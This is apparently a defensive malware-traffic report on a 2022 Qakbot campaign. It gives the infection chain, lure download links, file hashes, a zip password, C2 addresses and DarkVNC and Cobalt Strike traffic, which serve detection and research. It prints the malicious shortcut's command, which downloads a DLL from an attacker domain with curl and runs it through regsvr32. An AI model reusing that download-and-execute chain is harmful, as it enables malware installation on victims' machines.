@@ -1,0 +1,79 @@
+2022-06-21 (TUESDAY) - AA DISTRIBUTION QAKBOT (QBOT) WITH DARK VNC AND COBALT STRIKE
+
+REFERENCE:
+
+- https://twitter.com/Unit42_Intel/status/1539700018558427140
+
+INFECTION CHAIN:
+
+- Thread-hijacked email --> link --> password-protected zip --> Windows shortcut --> Qakbot --> follow-up malware
+
+EXAMPLES OF LINKS FROM EMAILS:
+
+- hxxps://drive.google[.]com/uc?export=download&id=12YCPlGhj4bO0NWSJtS8agl52ox7D8_6G&confirm=t
+- hxxps://drive.google[.]com/uc?export=download&id=1fsanLKV8A93QBID-3w4URnl1DGaSvXOW&confirm=t
+- hxxps://drive.google[.]com/uc?export=download&id=1KNl9wwEIVZ5FOyn1BruyWwIrCslFkRGp&confirm=t
+- hxxps://drive.google[.]com/uc?export=download&id=1ppV4rCVKnDlJVE4WJ9PfPtiThoA0VdnO&confirm=t
+- hxxps://drive.google[.]com/uc?export=download&id=1sVNWr2l36_fFBrG0bSDdOMR6IqaXXNuL&confirm=t
+- hxxps://drive.google[.]com/uc?export=download&id=1tjQ48mlBKbF4NvzCx-3h_0e6cq_qUQBU&confirm=t
+- hxxps://drive.google[.]com/uc?export=download&id=1WOOtmsN4AY7YT3FEXMszp9sJZEu_80aZ&confirm=t
+- hxxps://drive.google[.]com/uc?export=download&id=1xCZknxKBantEN9pywyVCzhd8RQUlb663&confirm=t
+- hxxps://drive.google[.]com/uc?export=download&id=1XpJ53bzmOLBhicqonqfAvUQZODPOb6tO&confirm=t
+- hxxps://drive.google[.]com/uc?export=download&id=1yZwjAU90kJUAV1o6RStf9xSLxeS2Dv9x&confirm=t
+- hxxps://drive.google[.]com/uc?export=download&id=1YYjRd6O7GCIAoDawI4i6fB2mjjMtSAzm&confirm=t
+- hxxps://drive.google[.]com/uc?export=download&id=1ZXle00cAMSdXupJwtBGB-N9OFekAYPiD&confirm=t
+
+EXAMPLE OF DOWNLOADED ZIP ARCHIVE:
+
+- SHA256 hash: 311730a296273acfbec85799b25f23b4698c8cc532ca2028a55f31c8b0686b03
+- File size: 1,230 bytes
+- File name: reiciendisperferendis.zip
+- File description: password-protected zip archive downloaded from link in the email
+- Password: E98346
+
+EXTRACTED WINDOWS SHORTCUT:
+
+- SHA256 hash: c9dfafd3536977289b4bfda1369fbd113a778cf06ac0c01cdc8e00e1c300e774
+- File size: 2,093 bytes
+- File name: reiciendisperferendis.lnk
+- File description: Windows shortcut extracted from the above zip archive
+
+COMMAND ISSUED BY THE ABOVE SHORTCUT:
+
+C:\Windows\System32\cmd.exe /q /c echo 'i0' && 
+ping yrl.net && 
+MD "%HOMEPATH%\Wc\ItF5" && 
+curl.exe --output %HOMEPATH%\Wc\ItF5\t3JC.frZL.YXSA hxxps://maagayatrilogistics[.]com/WUK4Q/q.png && 
+regsvr32 -u "%HOMEPATH%\Wc\ItF5\t3JC.frZL.YXSA" 
+&& ping 0Ev.com
+
+QAKBOT DLL RETRIEVED BY THE WINDOWS SHORTCUT:
+
+- SHA256 hash: 26748f1f6c740dc9ce9c480bc0fe49416b90672567cce3d77e4f16bcb92d7662
+- File size: 739,934 bytes
+- File location: hxxps://maagayatrilogistics[.]com/WUK4Q/q.png
+- File location: C:\Users\[username]\Wc\ItF5\t3JC.frZL.YXSA
+- File type: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows
+- Run method: regsvr32.exe [filename]
+
+QAKBOT DLL PERSISTENT ON THE INFECTED WINDOWS HOST:
+
+- SHA256 hash: 8680626d35a7528e6025ca2bfc757967847bb4d0ab4c24e56083d739dfbad9dc
+- File size: 732,599 bytes
+- File location: C:\Users\[username]\AppData\Roaming\Microsoft\Ccnwa\urdvwi.dll
+- File type: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows
+- Run method: regsvr32.exe [filename]
+
+TRAFFIC FROM THE QAKBOT INFECTION:
+
+- 192.185.129[.]139 port 443 - hxxps://maagayatrilogistics[.]com/WUK4Q/q.png
+- 76.25.142[.]196 port 443 - Qakbot HTTPS C2 traffic
+- port 443 - www.openssl[.]org - Connectivity check by infected Windows host
+- 23.111.114[.]52 port 65400 - TCP traffic caused by Qakbot
+- port 443 - api.ipify[.]org - IP address check by infected Windows host
+- various IP addresses over various ports - Email banner traffic/SMTP activity
+
+TRAFFIC CAUSED BY FOLLOW-UP MALWARE:
+
+- 78.31.67[.]7 port 443 - DarkVNC traffic
+- 190.123.44[.]130 port 443 - trikh[.]icu - Cobalt Strike HTTPS traffic
